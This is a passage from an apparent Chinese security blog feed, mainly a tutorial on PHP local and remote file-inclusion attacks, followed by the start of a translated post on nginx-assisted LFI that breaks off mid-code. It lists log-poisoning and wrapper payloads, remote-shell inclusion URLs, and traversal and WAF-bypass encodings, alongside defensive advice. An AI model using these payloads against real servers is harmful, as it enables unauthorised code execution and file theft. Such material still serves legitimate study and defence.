&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log </p><p>错误日志 &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log </p><p>把文件日志包含进来即可包含中。如果日志有 php 恶意代码，也可导致 getshell。</p><p>常见日志路径：</p><h3 id="apache-Linux"><a href="#apache-Linux" class="headerlink" title="apache+Linux"></a>apache+Linux</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>logs/access_log<br><span class="hljs-regexp">/logs/</span>access_log<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/logs/</span>access_log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access_log<br></code></pre></td></tr></table></figure><h3 id="apache-win2003"><a href="#apache-win2003" class="headerlink" title="apache+win2003"></a>apache+win2003</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">D</span>:\xampp\apache\logs\access.log<br><span class="hljs-name">D</span>:\xampp\apache\logs\error.log<br></code></pre></td></tr></table></figure><h3 id="IIS6-0-win2003"><a href="#IIS6-0-win2003" class="headerlink" title="IIS6.0+win2003"></a>IIS6.0+win2003</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\WINDOWS\system32\Logfiles<br></code></pre></td></tr></table></figure><h3 id="IIS7-0-win2003"><a href="#IIS7-0-win2003" class="headerlink" title="IIS7.0+win2003"></a>IIS7.0+win2003</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">SystemDrive</span></span>%\inetpub\logs\LogFiles<br></code></pre></td></tr></table></figure><h3 id="nginx日志"><a href="#nginx日志" class="headerlink" title="nginx日志"></a>nginx日志</h3><p>日志文件在用户安装目录logs目录下,假设安装路径为&#x2F;usr&#x2F;local&#x2F;nginx,那日志目录就是在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs下面</p><h3 id="ssh-log"><a href="#ssh-log" class="headerlink" title="ssh-log"></a>ssh-log</h3><p>用ssh连接：</p><p><code>ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@【remote host】</code></p><p>之后会提示输入密码，随便输入就可以。</p><p>然后在remotehost的ssh-log中就写入了这个php代码</p><p>然后利用文件包含，包含日志文件</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/auth.<span class="hljs-built_in">log</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/secure<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>如ftp、smtp等配置文件和日志，具体情况具体分析</p><h2 id="包含环境变量getshell"><a href="#包含环境变量getshell" class="headerlink" title="包含环境变量getshell"></a>包含环境变量getshell</h2><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。environ文件默认位置：&#x2F;proc&#x2F;self&#x2F;environ。在Linux系统下(FreeBSD是没有这个的)。Windows系统没有。</li></ol><p>姿势：</p><p>&#x2F;proc&#x2F;self&#x2F;environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><h2 id="包含-proc-PID-fd-FD（文件描述符）"><a href="#包含-proc-PID-fd-FD（文件描述符）" class="headerlink" title="包含&#x2F;proc&#x2F;$PID&#x2F;fd&#x2F;$FD（文件描述符）"></a>包含&#x2F;proc&#x2F;$PID&#x2F;fd&#x2F;$FD（文件描述符）</h2><p>文件描述符：File descriptor,简称fd，当应用程序请求内核打开&#x2F;新建一个文件时，内核会返回一个文件描述符用于对应这个打开&#x2F;新建的文件，其fd本质上就是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p><p>利用方法：</p><ol><li>上传大量的shell（比如100个）</li><li>包含<code>http://example.com/index.php?page=/proc/$PID/fd/$FD</code> $PID是进程号，$FD是文件描述符，两个都为整数，可以爆破</li></ol><p>默认位置：&#x2F;proc&#x2F;$PID&#x2F;fd&#x2F;$FD。在Linux系统下。Windows系统没有。</p><p>只是和包含environ类似，默认的权限不一定能满足条件（www-data权限不够无法访问），所以比较鸡肋</p><p>参考<a href="https://blog.csdn.net/qq_27446553/article/details/78062076">挖洞经验 | 把PHP LFI漏洞变成Webshell的思路</a></p><h2 id="phpinfo-包含post上传临时文件getshell"><a href="#phpinfo-包含post上传临时文件getshell" class="headerlink" title="phpinfo+包含post上传临时文件getshell"></a>phpinfo+包含post上传临时文件getshell</h2><p>见复现文章</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span> — 访问本地文件系统<br>http:<span class="hljs-regexp">//</span> — 访问 HTTP(s) 网址<br>ftp:<span class="hljs-regexp">//</span> — 访问 FTP(s) URLs<br>php:<span class="hljs-regexp">//</span> — 访问各个输入<span class="hljs-regexp">/输出流（I/</span>O streams）<br>zlib:<span class="hljs-regexp">//</span> — 压缩流<br>data:<span class="hljs-regexp">//</span> — 数据（RFC <span class="hljs-number">2397</span>）<br>glob:<span class="hljs-regexp">//</span> — 查找匹配的文件路径模式<br>phar:<span class="hljs-regexp">//</span> — PHP 归档<br>ssh2:<span class="hljs-regexp">//</span> — Secure Shell <span class="hljs-number">2</span><br>rar:<span class="hljs-regexp">//</span> — RAR<br>ogg:<span class="hljs-regexp">//</span> — 音频流<br>expect:<span class="hljs-regexp">//</span> — 处理交互式的流<br></code></pre></td></tr></table></figure><h3 id="php-ini-参数设置"><a href="#php-ini-参数设置" class="headerlink" title="php.ini 参数设置"></a>php.ini 参数设置</h3><p>在 php.ini 里关于文件包含有两个重要的参数 allow_url_fopen、allow_url_include</p><p>allow_url_fopen:默认值是 ON，允许 url 里的封装协议访问文件</p><p>allow_url_include:默认值是 OFF，不允许包含 url 里的封装协议包</p><p>各协议利用条件和方法：</p><table><thead><tr><th>协议</th><th>测试PHP版本</th><th>allow_url_fopen</th><th>allow_url_include</th><th>用法</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;&#x2F;etc&#x2F;passwd</td></tr><tr><td>php:&#x2F;&#x2F;filter</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php</td></tr><tr><td>php:&#x2F;&#x2F;input</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td><strong>on</strong></td><td>?file&#x3D;php:&#x2F;&#x2F;input  【POST DATA】<code>&lt;?php phpinfo();?&gt;</code></td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;zip:&#x2F;&#x2F;.&#x2F;file.zip%23shell.txt</td></tr><tr><td>compress.bzip2:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</td></tr><tr><td>compress.zlib:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.gz</td></tr><tr><td>data:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td><strong>on</strong></td><td><strong>on</strong></td><td><code>?file=data://text/plain,&lt;?php phpinfo();?&gt;</code>【or】<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code> 【or】<code>?file=data:text/plain,&lt;?php phpinfo();?&gt;</code>【or】<code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></td></tr></tbody></table><p>注：【POST DATA】代表后面的内容为http body，【or】代表“或”，表示其他的姿势；</p><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>file协议用于直接读取文件</p><h3 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><p>php:&#x2F;&#x2F; 用于访问各个输入&#x2F;输出流（I&#x2F;O streams），经常使用的是 php:&#x2F;&#x2F;filter 和 php:&#x2F;&#x2F;input</p><p>php:&#x2F;&#x2F;filter 用于读取源码</p><p>php:&#x2F;&#x2F;input 用于执行 php 代码</p><p>具体查看PHP官方文档 <a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p>可用的过滤器（4类）：字符串过滤器、转换过滤器、压缩过滤器、加密过滤器 <a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作 php 代码执行。当传入的参数作为文件名打开时，可以将参数设为<code>php://input</code>，同时 post 想设置的文件内容，php 执行时会将post的内容当作文件内容。</p><p>注意：当 enctype&#x3D;”multipart&#x2F;form-data”，php:&#x2F;&#x2F;input 是无效的。</p><p>设置请求为 post 请求 在正文输入 php 代码<code>&lt;?php phpinfo();?&gt;</code>提交即可</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>可用rot13和base64加密，php:&#x2F;&#x2F;filter大小写不敏感</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>read=string.rot13/resource=index.php<br>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=index.php<br>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=pHp:/</span><span class="hljs-regexp">/FilTer/</span>convert.base64-encode/resource=index.php<br><br><span class="hljs-regexp">//</span> 可以连接一个压缩wrapper.<br>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>zlib.deflate<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h3 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php:expect://id<br>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php:expect://<span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><h3 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h3><p>phar、zip、bzip2、zlib等 <a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><h2 id="远程文件包含RFI条件"><a href="#远程文件包含RFI条件" class="headerlink" title="远程文件包含RFI条件"></a>远程文件包含RFI条件</h2><p>RFI的利用条件较为苛刻，需要php.ini中进行配置</p><ol><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ol><p>两个配置选项均需要为On，才能远程包含文件成功。</p><p>payload：<code>?file=http://test.com/shell.txt</code></p><h2 id="截断攻击"><a href="#截断攻击" class="headerlink" title="截断攻击"></a>截断攻击</h2><p>使用场景：可控文件名后面加了其他字符导致不完全可控，样例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过文件包含截断攻击，使后面附加内容的代码失效，让包含的文件名完全可控。</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>php 版本小于 5.3.4 允许使用%00 截断，在使用 include 等文件包含函数，可以截断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成\0 截断会失败。</p><h3 id="超长文件名截断"><a href="#超长文件名截断" class="headerlink" title="超长文件名截断"></a>超长文件名截断</h3><p>这个合适于 win32，可以使用<code>\.</code>和<code>.</code>进行截断。注意：win2003为win32可以使用这个特性，而win2008及以上都为64位，无法使用这个特性。</p><p>(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256) </p><p>利用操作系统对目录最大长度限制。 </p><p>在 window 下 256 字节 </p><p>linux 下 4096 字节</p><p><code>.</code>截断</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">?file=x.jpg<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p><code>\.</code>截断</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=x.jpg<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./.<br></code></pre></td></tr></table></figure><h2 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h2><p>分为两种情况，前缀和后缀，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>/var/www/html/</code>是前缀，<code>.php</code>是后缀，绕过这两种情况的方法不相同</p><h3 id="绕过前缀"><a href="#绕过前缀" class="headerlink" title="绕过前缀"></a>绕过前缀</h3><p>这里只考虑存在前缀的情况，先不考虑后缀。</p><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>可以用目录遍历绕过，payload：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>log/test.txt<br></code></pre></td></tr></table></figure><p>此时服务器实际拼接出来的路径为：<code>/var/www/html/../../log/test.txt</code>，即<code>/var/log/test.txt</code>，故成功绕过了前缀限制。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有些waf会对<code>../</code>做过滤或拦截，可以利用url编码绕过</p><p><strong>1.利用url编码</strong></p><ul><li>..&#x2F;<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e&#x2F;</li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul><p><strong>2.二次编码</strong></p><ul><li>..&#x2F;<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul><p><strong>3.容器&#x2F;服务器的编码方式</strong></p><ul><li>..&#x2F;<ul><li>..%c0%af<ul><li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></li></ul></li><li>%c0%ae%c0%ae&#x2F;<ul><li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li><li>Apache Tomcat Directory Traversal(Apache Tomcat 目录遍历)</li></ul></li></ul></li><li>..\<ul><li>..%c1%9c</li></ul></li></ul><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>如果waf过滤一次<code>../</code>，那么可以双写绕过，payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>log/test.txt<br></code></pre></td></tr></table></figure><h3 id="绕过后缀"><a href="#绕过后缀" class="headerlink" title="绕过后缀"></a>绕过后缀</h3><p>这里一样也是只考虑后缀，先不考虑前缀。</p><h4 id="query绕过"><a href="#query绕过" class="headerlink" title="query绕过"></a>query绕过</h4><p>url中的问号?代表后面跟的是查询参数，可以利用这个特性绕过后缀，问号?的url编码为%3f，在url中也可以用%3f代替，payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://ip.com/<span class="hljs-built_in">shell</span>.txt%<span class="hljs-number">3</span>f<br></code></pre></td></tr></table></figure><p>在服务器中拼接成为<code>http://ip.com/shell.txt?.php</code>，相当于<code>.php</code>变成了查询参数</p><h4 id="fragment绕过"><a href="#fragment绕过" class="headerlink" title="fragment绕过"></a>fragment绕过</h4><p>fragment在url中也成为“锚点”，就是我们常见的井号#，在井号后面的字符会被锚点，而不是路径的一部分，所以也可以利用这个特性绕过后缀，井号#的url编码为%23，在url中可以用%23代替，payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://ip.com/<span class="hljs-built_in">shell</span>.txt%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>会在服务器中拼接为<code>http://ip.com/shell.txt#.php</code>，<code>.php</code>被当成了锚点，造成了绕过</p><h4 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h4><p>上面截断攻击的部分已经介绍过了，这里不再赘述</p><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol><li>严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是 否可被外部控制</li><li>路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：”..&#x2F;“</li><li>包含文件验证：验证被包含的文件是否是白名单中的一员</li><li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(‘head.php’)</li><li>设置 allow_url_include 为 Off</li></ol><h1 id="审计技巧"><a href="#审计技巧" class="headerlink" title="审计技巧"></a>审计技巧</h1><p>待补充…</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">php文件包含漏洞</a></p><p><a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道CTF题：PHP文件包含</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【翻译】通过nginx实现php本地文件包含</title>
    <link href="/2022/05/17/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E9%80%9A%E8%BF%87nginx%E5%AE%9E%E7%8E%B0php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/05/17/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E9%80%9A%E8%BF%87nginx%E5%AE%9E%E7%8E%B0php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>原文链接<a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">php-lfi-with-nginx-assistance</a></p><p>这篇文章展示了一种崭新的但较为普遍的本地文件包含攻击漏洞。实验环境只需要php+nginx，标准配置即可。这项技术在hxp CTF 2021的includer’s revenge &#x2F; counter中发现。</p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>PHP本地文件包含技术在安全研究中有着非常久远的历史，并且在CTF中非常常见。这些年中诞生了很多trick。</p><ul><li><code>PHP_SESSION_UPLOAD_PROGRESSS</code>trick - <a href="https://blog.orange.tw/2018/10/">https://blog.orange.tw/2018/10/</a></li><li>wrapper 类似compress.zlib:&#x2F;&#x2F; 来实现上传临时文件 - <a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer">https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer</a></li><li>临时文件&#x2F;<code>FindFirstFile</code>trick - <a href="https://gynvael.coldwind.pl/?id=376">https://gynvael.coldwind.pl/?id=376</a></li><li>LFI with <code>phpinfo()</code> assistance - <a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf</a></li><li><code>/proc/self/environ</code>trick - <a href="https://www.exploit-db.com/papers/12886">https://www.exploit-db.com/papers/12886</a></li><li><code>/var/log/apache2/*log</code> （可能已经失效了）</li><li>等等</li></ul><p>大多数当前的LFI都依赖于PHP能够产生一些形式的临时文件或者session文件。首先让我们看看下面的例子，上面的trick都不起作用</p><p><a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz">Download runnable example &amp; exploit</a>.</p><p>php 代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>FPM &#x2F; PHP config</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">...</span><br>php_admin_value[session.upload_progress.enabled] = 0<br>php_admin_value[file_uploads] = 0<br><span class="hljs-meta prompt_">...</span><br></code></pre></td></tr></table></figure><p>Setup &#x2F; hardening:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">...<br>chown -R <span class="hljs-number">0</span>:<span class="hljs-number">0</span> <span class="hljs-regexp">/tmp /</span>var<span class="hljs-regexp">/tmp /</span>var<span class="hljs-regexp">/lib/</span>php/sessions<br>chmod -R <span class="hljs-number">000</span> <span class="hljs-regexp">/tmp /</span>var<span class="hljs-regexp">/tmp /</span>var<span class="hljs-regexp">/lib/</span>php/sessions<br>...<br></code></pre></td></tr></table></figure><p>幸运的是目前php通常用PHP-FPM和nginx来部署。nginx提供一个容易被忽视的特性叫 <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">client body buffering</a>，如果client body（不局限于post请求）大于一个确定的数值，那么就会创建一个临时文件</p><p>如果nginx以与PHP相同的用户身份来运行（通常以www-data的形式运行），则此功能可以在没有任何其他方式创建文件的情况下利用LFI。</p><p>相应的nginx代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ngx_fd_t</span><br><span class="hljs-title function_">ngx_open_tempfile</span><span class="hljs-params">(u_char *name, <span class="hljs-type">ngx_uint_t</span> persistent, <span class="hljs-type">ngx_uint_t</span> 